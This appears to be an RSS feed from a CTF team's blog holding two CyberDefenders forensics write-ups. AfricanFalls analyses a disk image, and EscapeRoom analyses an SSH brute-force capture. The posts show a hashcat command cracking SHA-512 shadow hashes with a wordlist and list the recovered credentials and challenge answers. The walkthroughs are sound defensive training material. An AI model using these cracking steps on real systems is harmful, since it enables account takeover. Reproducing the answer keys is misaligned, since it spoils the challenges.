<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>4n6 &amp; k8s • Posts by &#34;cyberdefenders&#34; category</title>
        <link>http://example.com</link>
        <description>We are a Forensics Duo at SOter14 CTF Team &amp; Network Engineering Students at INSAT. Enjoy our Kubernetes Articles and Write-ups!</description>
        <language>en</language>
        <pubDate>Fri, 09 Sep 2022 00:20:27 +0100</pubDate>
        <lastBuildDate>Fri, 09 Sep 2022 00:20:27 +0100</lastBuildDate>
        <category>kubernetes</category>
        <item>
            <guid isPermalink="true">http://example.com/2022/09/09/CyberDefenders/affrica-falls/</guid>
            <title>CyberDefenders Writeup AfricanFalls</title>
            <link>http://example.com/2022/09/09/CyberDefenders/affrica-falls/</link>
            <pubDate>Fri, 09 Sep 2022 00:20:27 +0100</pubDate>
            <description><![CDATA[ &lt;p&gt;This CTF challenge is from AfricaFalls Digital Forensics contest , We have disk image that have a lot of information like password, registries, browser history etc…&lt;br&gt;
We will investigate some useful informations! Be ready&lt;/p&gt;
&lt;h1 id=&#34;challenge-information&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#challenge-information&#34;&gt;#&lt;/a&gt; Challenge Information&lt;/h1&gt;
&lt;details class=&#34;info&#34;&gt;&lt;summary&gt;Description&lt;/summary&gt;&lt;div&gt;
&lt;p&gt;John Doe was accused of doing illegal activities. A disk image of his laptop was taken. Your task is to analyze the image and understand what happened under the hood.&lt;/p&gt;
&lt;/div&gt;&lt;/details&gt;
&lt;p&gt;Challenge Link &amp;amp; Author&lt;/p&gt;
&lt;div class=&#34;links&#34;&gt;&lt;div class=&#34;item&#34; title=&#34;Challenge Link&#34; style=&#34;--block-color:#2296fd;&#34;&gt;&lt;span class=&#34;exturl image&#34; data-url=&#34;aHR0cHM6Ly9jeWJlcmRlZmVuZGVycy5vcmcvYmx1ZXRlYW0tY3RmLWNoYWxsZW5nZXMvNjY=&#34; data-background-image=&#34;https://cyberdefenders.org/static/img/cyberdefenders-logo-white.png&#34;&gt;&lt;/span&gt;
          &lt;div class=&#34;info&#34;&gt;
          &lt;span class=&#34;exturl title&#34; data-url=&#34;aHR0cHM6Ly9jeWJlcmRlZmVuZGVycy5vcmcvYmx1ZXRlYW0tY3RmLWNoYWxsZW5nZXMvNjY=&#34;&gt;Challenge Link&lt;/span&gt;
          &lt;p class=&#34;desc&#34;&gt;CyberDefenders - Brave&lt;/p&gt;
          &lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;item&#34; title=&#34;Author - DFIRScience&#34; style=&#34;--block-color:#fcc11c;&#34;&gt;&lt;span class=&#34;exturl image&#34; data-url=&#34;aHR0cHM6Ly90d2l0dGVyLmNvbS9ERklSU2NpZW5jZQ==&#34; data-background-image=&#34;https://pbs.twimg.com/profile_images/1517319188167204866/lgRHWtGk_400x400.jpg&#34;&gt;&lt;/span&gt;
          &lt;div class=&#34;info&#34;&gt;
          &lt;span class=&#34;exturl title&#34; data-url=&#34;aHR0cHM6Ly90d2l0dGVyLmNvbS9ERklSU2NpZW5jZQ==&#34;&gt;Author - DFIRScience&lt;/span&gt;
          &lt;p class=&#34;desc&#34;&gt;DFIRScience Twitter Profile&lt;/p&gt;
          &lt;/div&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h1 id=&#34;walkthrough&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#walkthrough&#34;&gt;#&lt;/a&gt; Walkthrough&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;1- What is the MD5 hash value of the suspect disk?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Just inspec the  &lt;code&gt;ad1.txt&lt;/code&gt;  and you’ll find useful information about the disk image like the acquisition time and the checksum&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption&gt;&lt;span&gt;command line prompt&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;cat&lt;/span&gt; DiskDrigger.ad1.txt &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Created By AccessData® FTK® Imager 4.5.0.3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Case Information:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Acquired using: ADI4.5.0.3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[Computed Hashes]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; MD5 checksum:    9471e69c95d8909ae60ddff30d50ffa1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; SHA1 checksum:   167aa08db25dfeeb876b0176ddc329a3d9f2803a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Image information:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; Acquisition started:   Tue Jun 15 12:28:20 2021&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; Acquisition finished:  Tue Jun 15 12:33:10 2021&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; Segment list:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  D:\Users\Mawso3a\Desktop\DiskDrigger.ad1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Image Verification Results:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; Verification started:  Tue Jun 15 12:33:18 2021&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; Verification finished: Tue Jun 15 12:33:51 2021&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; MD5 checksum:    9471e69c95d8909ae60ddff30d50ffa1 : verified&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; SHA1 checksum:   167aa08db25dfeeb876b0176ddc329a3d9f2803a : verified&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;div class=&#34;note success&#34;&gt;
&lt;p&gt;Answer: 9471e69c95d8909ae60ddff30d50ffa1&lt;/p&gt;
&lt;/div&gt;
&lt;blockquote&gt;
&lt;p&gt;2- What phrase did the suspect search for on 2021-04-29 18:17:38 UTC? (three words, two spaces in between)&lt;br&gt;
We found that the user used a chrome as his main browser! So we decide to get the database that contains the history of browsing. We can inspect it with DB Browser SQLite&lt;br&gt;
&lt;img data-src=&#34;https://imgur.com/YdY9w1L.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
After Opening the database you can search about the history and find the correct answer using the right timestamp&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img data-src=&#34;https://imgur.com/jL9EEDB.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;note success&#34;&gt;
&lt;p&gt;Answer:  password cracking lists&lt;/p&gt;
&lt;/div&gt;
&lt;blockquote&gt;
&lt;p&gt;3- What is the IPv4 address of the FTP server the suspect connected to?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Wait man! FileZilla is installed in our system. I am sure that we will find the information in  &lt;code&gt;filezilla.xml&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://imgur.com/uOJpYIM.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;note success&#34;&gt;
&lt;p&gt;Answer:  192.168.1.20&lt;/p&gt;
&lt;/div&gt;
&lt;blockquote&gt;
&lt;p&gt;4- What date and time was a password list deleted in UTC? (YYYY-MM-DD HH:MM:SS UTC)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This is EASY DUDE! just check the Recycle Bin ! You’ll find your target !&lt;br&gt;
&lt;img data-src=&#34;https://imgur.com/TuEyvM2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;note success&#34;&gt;
&lt;p&gt;Answer:  2021-04-29 18:22:17 UTC&lt;/p&gt;
&lt;/div&gt;
&lt;blockquote&gt;
&lt;p&gt;5- How many times was Tor Browser ran on the suspect’s computer? (number only)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I guess this question is tricky! where is tor man !!! OK calm down you’ll find  &lt;code&gt;lnk&lt;/code&gt;  file about tor but i think it’s fake one ! Let’s try an LNK Parser. I’ll use  &lt;code&gt;ericzimmerman&lt;/code&gt;  tool !&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://imgur.com/GelvVNQ.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Wow firefox.exe in TOR LNK file! This is Joke&lt;/p&gt;
&lt;div class=&#34;note success&#34;&gt;
&lt;p&gt;Answer:  0&lt;/p&gt;
&lt;/div&gt;
&lt;blockquote&gt;
&lt;p&gt;6- What is the suspect’s email address?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;OK backing again to the browser history to check if the user visit a mailing website !&lt;br&gt;
&lt;img data-src=&#34;https://imgur.com/BmHa8m2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;note success&#34;&gt;
&lt;p&gt;Answer:   &lt;span class=&#34;exturl&#34; data-url=&#34;bWFpbHRvOmRyZWFtbWFrZXI4MkBwcm90b25tYWlsLmNvbQ==&#34;&gt;dreammaker82@protonmail.com&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;blockquote&gt;
&lt;p&gt;7- What is the FQDN did the suspect port scan?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;He asked about port scan?? mmm I guess nmap is here ! Nmap are you here ?&lt;br&gt;
&lt;img data-src=&#34;https://imgur.com/UMN9Zbr.png&#34; alt=&#34;&#34; title=&#34;NMAP: YES I AM HERE !&#34;&gt;&lt;/p&gt;
&lt;p&gt;Just i checked the PowerShell history. You’ll find it in  &lt;code&gt;AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://imgur.com/OwOcsXB.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;note success&#34;&gt;
&lt;p&gt;Answer:  dfir.science&lt;/p&gt;
&lt;/div&gt;
&lt;blockquote&gt;
&lt;p&gt;8- What country was picture “20210429_152043.jpg” allegedly taken in?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I tried to inspect the metadata of the image and i found GPS position information!&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption&gt;&lt;span&gt;command line prompt&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;exiftool 20210429_152043.jpg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;....&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;....&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;GPS Latitude                    : 16 deg 0&lt;span class=&#34;string&#34;&gt;&amp;#x27; 0.00&amp;quot; S&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;GPS Longitude                   : 23 deg 0&amp;#x27;&lt;/span&gt; 0.00&lt;span class=&#34;string&#34;&gt;&amp;quot; E&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Focal Length                    : 3.7 mm&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;GPS Position                    : 16 deg 0&amp;#x27; 0.00&amp;quot;&lt;/span&gt; S, 23 deg 0&lt;span class=&#34;string&#34;&gt;&amp;#x27; 0.00&amp;quot; E&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Light Value                     : 13.7&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Ok let’s try to find the country using GPS Coordinates Finder&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://imgur.com/freR9Vd.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;note success&#34;&gt;
&lt;p&gt;Answer:  Zambia&lt;/p&gt;
&lt;/div&gt;
&lt;blockquote&gt;
&lt;p&gt;9- What is the parent folder name picture “20210429_151535.jpg” was in before the suspect copy it to “contact” folder on his desktop?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Shellbags explorer will solve our problem here! But wait man ! What are ShellBag artifacts?&lt;br&gt;
 &lt;code&gt;ShellBags&lt;/code&gt;  are a popular artifact in Windows forensics often used to identify the existence of directories on local, network, and removable storage devices. ShellBags are stored as a highly nested and hierarchal set of subkeys in the UsrClass&lt;br&gt;
This registyr hive will save us :  &lt;code&gt;[root]\Users\John Doe\AppData\Local\Microsoft\Windows\Usrclass.dat&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;ٍ&lt;img data-src=&#34;https://imgur.com/IAJ0GBZ.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;note success&#34;&gt;
&lt;p&gt;Answer:  Camera&lt;/p&gt;
&lt;/div&gt;
&lt;blockquote&gt;
&lt;p&gt;10- A Windows password hashes for an account are below. What is the user’s password?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Just try an online hash cracker&lt;/p&gt;
&lt;p&gt;ٍ&lt;img data-src=&#34;https://imgur.com/eQ1U5w7.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;note success&#34;&gt;
&lt;p&gt;Answer:   AFR1CA!&lt;/p&gt;
&lt;/div&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2022/09/07/CyberDefenders/EscapeRoom/</guid>
            <title>CyberDefenders Writeup EscapeRoom</title>
            <link>http://example.com/2022/09/07/CyberDefenders/EscapeRoom/</link>
            <pubDate>Wed, 07 Sep 2022 16:28:39 +0100</pubDate>
            <description><![CDATA[ &lt;p&gt;This CTF challenge is made by The Honeynet Project organization. This challenge is a combination of several entry to intermediate-level tasks of increasing difficulty focusing on authentication, information hiding, and cryptography.&lt;/p&gt;
&lt;h1 id=&#34;challenge-information&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#challenge-information&#34;&gt;#&lt;/a&gt; Challenge Information&lt;/h1&gt;
&lt;details class=&#34;info&#34;&gt;&lt;summary&gt;Description&lt;/summary&gt;&lt;div&gt;
&lt;p&gt;You belong to a company specializing in hosting web applications through KVM-based Virtual Machines. Over the weekend, one VM went down, and the site administrators fear this might be the result of malicious activity. They extracted a few logs from the environment in hopes that you might be able to determine what happened.&lt;/p&gt;
&lt;/div&gt;&lt;/details&gt;
&lt;p&gt;Challenge Link &amp;amp; Author&lt;/p&gt;
&lt;div class=&#34;links&#34;&gt;&lt;div class=&#34;item&#34; title=&#34;Challenge Link&#34; style=&#34;--block-color:#2296fd;&#34;&gt;&lt;span class=&#34;exturl image&#34; data-url=&#34;aHR0cHM6Ly9jeWJlcmRlZmVuZGVycy5vcmcvYmx1ZXRlYW0tY3RmLWNoYWxsZW5nZXMvMTg=&#34; data-background-image=&#34;https://cyberdefenders.org/static/img/cyberdefenders-logo-white.png&#34;&gt;&lt;/span&gt;
          &lt;div class=&#34;info&#34;&gt;
          &lt;span class=&#34;exturl title&#34; data-url=&#34;aHR0cHM6Ly9jeWJlcmRlZmVuZGVycy5vcmcvYmx1ZXRlYW0tY3RmLWNoYWxsZW5nZXMvMTg=&#34;&gt;Challenge Link&lt;/span&gt;
          &lt;p class=&#34;desc&#34;&gt;CyberDefenders - EscapeRoom&lt;/p&gt;
          &lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;item&#34; title=&#34;Author - The Honeynet Project&#34; style=&#34;--block-color:#fcc11c;&#34;&gt;&lt;span class=&#34;exturl image&#34; data-url=&#34;aHR0cHM6Ly90d2l0dGVyLmNvbS9Qcm9qZWN0SG9uZXluZXQ=&#34; data-background-image=&#34;https://pbs.twimg.com/profile_images/582417177254334464/BNceiZYA_400x400.png&#34;&gt;&lt;/span&gt;
          &lt;div class=&#34;info&#34;&gt;
          &lt;span class=&#34;exturl title&#34; data-url=&#34;aHR0cHM6Ly90d2l0dGVyLmNvbS9Qcm9qZWN0SG9uZXluZXQ=&#34;&gt;Author - The Honeynet Project&lt;/span&gt;
          &lt;p class=&#34;desc&#34;&gt;The Honeynet Project Twitter Profile&lt;/p&gt;
          &lt;/div&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h1 id=&#34;walkthrough&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#walkthrough&#34;&gt;#&lt;/a&gt; Walkthrough&lt;/h1&gt;
&lt;p&gt;We start analyzing the pcap file, i open it with Brim Security and checking the alerts!! Oh god! A lot of ssh flows! mmm I guess the attacker try to gain access through the ssh service, he did a bruteforce attack !&lt;br&gt;
&lt;img data-src=&#34;https://imgur.com/cXk82fL.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;1- What service did the attacker use to gain access to the system?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The attacker use ssh protocol to gain access to the system !&lt;/p&gt;
&lt;div class=&#34;note success&#34;&gt;
&lt;p&gt;Answer: ssh&lt;/p&gt;
&lt;/div&gt;
&lt;blockquote&gt;
&lt;p&gt;2- What attack type was used to gain access to the system?(one word)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We found a lot of ssh packets! I am sure this is a bruteforce attack&lt;/p&gt;
&lt;div class=&#34;note success&#34;&gt;
&lt;p&gt;Answer: bruteforce&lt;/p&gt;
&lt;/div&gt;
&lt;blockquote&gt;
&lt;p&gt;3- What was the tool the attacker possibly used to perform this attack?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;One of the most famous tools that can do this type of attack is hydra&lt;br&gt;
Hydra is an amazing tool for testing the strength of your SSH security. It is capable of running through massive lists of usernames, passwords, and targets to test if you or a user is using a potentially vulnerable password.&lt;/p&gt;
&lt;div class=&#34;note success&#34;&gt;
&lt;p&gt;Answer: Hydra&lt;/p&gt;
&lt;/div&gt;
&lt;blockquote&gt;
&lt;p&gt;4- How many failed attempts were there?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Let’s inspect the alert events in Brim Security and apply the count() by feature in the  &lt;code&gt;alert.signature&lt;/code&gt; . We found 53  &lt;code&gt;NetSSH Hardcoded in Metasploit&lt;/code&gt; . We decrease by 1 the success one!&lt;br&gt;
&lt;img data-src=&#34;https://imgur.com/DpgkZjt.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;note success&#34;&gt;
&lt;p&gt;Answer: 52&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;We have the hashes of the passwords! We know that the hashes are SHA-512(UNIX). The black cat (oh means hashcat) will help us cracking these hashes!&lt;br&gt;
ٍ&lt;img data-src=&#34;https://imgur.com/DN0qNUF.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption&gt;&lt;span&gt;command line prompt&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;hashcat -a 0 -m 1800 shadow.log rockyou.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Session..........: hashcat&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Status...........: Running&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Hash.Target......: crack.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Time.Started.....: Wed Sep  7 23:58:23 2022 (43 mins, 15 secs)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Time.Estimated...: Fri Sep  9 04:15:48 2022 (1 day, 3 hours)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Kernel.Feature...: Pure Kernel&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Guess.Base.......: File (/mnt/c/Users/Mohamed Rafraf/Desktop/rockyou.txt)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Guess.Queue......: 1/1 (100.00%)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Speed.1.........:      986 H/s (5.30ms) @ Accel:32 Loops:1024 Thr:1 Vec:4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Recovered........: 3/10 (30.00%) Digests, 3/10 (30.00%) Salts&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Progress.........: 3579360/143443840 (2.50%)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Rejected.........: 0/3579360 (0.00%)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Restore.Point....: 357920/14344384 (2.50%)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Restore.Sub.1...: Salt:5 Amplifier:0-1 Iteration:4096-5000&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Candidate.Engine.: Device Generator&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Candidates.1....: donjoe -&amp;gt; dominique12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit =&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;blockquote&gt;
&lt;p&gt;5- What credentials (username:password) were used to gain access? Refer to shadow.log and sudoers.log.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Just wait for hashcat man!&lt;/p&gt;
&lt;div class=&#34;note success&#34;&gt;
&lt;p&gt;manager:forgot&lt;/p&gt;
&lt;/div&gt;
&lt;blockquote&gt;
&lt;p&gt;6- What other credentials (username:password) could have been used to gain access also have SUDO privileges? Refer to shadow.log and sudoers.log.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Hashcat will save you for sure !&lt;/p&gt;
&lt;div class=&#34;note success&#34;&gt;
&lt;p&gt;sean:spectre&lt;/p&gt;
&lt;/div&gt;
&lt;blockquote&gt;
&lt;p&gt;7- What is the tool used to download malicious files on the system?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Let’s check the  &lt;code&gt;user-agent&lt;/code&gt;  in brim security. you can do it with wireshark too!&lt;br&gt;
&lt;img data-src=&#34;https://imgur.com/P9haLBY.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;note success&#34;&gt;
&lt;p&gt;Answer: wget&lt;/p&gt;
&lt;/div&gt;
&lt;blockquote&gt;
&lt;p&gt;8- How many files the attacker download to perform malware installation?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Checking the non-media files in brim security will help us to know about the files&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://imgur.com/P6St7uU.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;note success&#34;&gt;
&lt;p&gt;Answer: 3&lt;/p&gt;
&lt;/div&gt;
&lt;blockquote&gt;
&lt;p&gt;9- What is the main malware MD5 hash?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The malware is an executable file for sure! let’s check it&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://imgur.com/VN12PmD.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Open the details about it and you’ll get the md5sum !&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://imgur.com/YgnR9gz.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;note success&#34;&gt;
&lt;p&gt;Answer: 772b620736b760c1d736b1e6ba2f885b&lt;/p&gt;
&lt;/div&gt;
